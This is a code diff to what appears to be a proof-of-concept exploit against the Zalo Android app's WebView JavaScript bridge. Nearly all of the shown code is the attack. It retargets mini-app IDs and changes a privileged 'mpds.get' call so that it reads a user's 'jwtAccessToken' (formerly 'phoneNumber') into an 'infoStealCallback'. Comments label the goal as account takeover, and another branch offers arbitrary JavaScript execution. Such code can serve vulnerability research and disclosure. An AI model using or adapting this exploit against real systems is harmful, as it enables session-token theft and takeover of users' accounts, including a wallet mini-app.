@@ -249,7 +249,7 @@ function webviewAnalyzerZaloInit() {
                 var miniAppIdParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamAppId);
                 if (miniAppIdParam == null || miniAppIdParam == '') {
                     // Default to the Zalo Mini-app App Store
-                    return '120953787914224736';
+                    return '4035076168682232033';
                 }
                 return miniAppIdParam;
             },
@@ -379,7 +379,7 @@ function webviewAnalyzerZaloInit() {
 
             // Try reading stored mini-app data
             var regexCaptureUrl = webviewAnalyzerZaloGetQueryParam('regexCaptureUrl');
-            if (regexCaptureUrl.includes('1637972034957224205') /* Zalo Wallet Mini App ID */) {
+            if (regexCaptureUrl.includes('4035076168682232033') /* Zalo Wallet Mini App ID */) {
                 ZaloJavaScriptInterface.SeanP.infoStealCallback = function (msg) {
                     if (typeof(msg) == 'string') {
                         msg = JSON.parse(msg);
@@ -400,8 +400,7 @@ function webviewAnalyzerZaloInit() {
                     ZaloJavaScriptInterface.jsCall(token, 'action.window.close', '', '{}', 'alert');
                 }
                 // ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"keys":["be_access_token"]},"appId":"2517980822879468590"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback'); //Be Take Over Account
-                ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":"mpds_data":{"keys":["phoneNumber"]},"appId":"1637972034957224205"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback'); //Be Take Over Account
-
+                ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', ` {"mpds_action":"mpds.get","mpds_data":{"keys":["jwtAccessToken"]},"appId":"4035076168682232033"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback'); //Be Take Over Account
 
             } else {
                 // Prompt for arbitrary JavaScript to execute
@@ -421,7 +420,7 @@ if (webviewAnalyzerIsZaloWebView()) {
 
     if (!ZaloJavaScriptInterface.SeanP.done) {
         ZaloJavaScriptInterface.SeanP.done = true;
-        ZaloJavaScriptInterface.SeanP.toMiniApp('1637972034957224205');
+        ZaloJavaScriptInterface.SeanP.toMiniApp('4035076168682232033');
     }
 } else {
     webViewAnalyzerDisplayError('This proof of concept should be opened within a Zalo Android app WebView.');
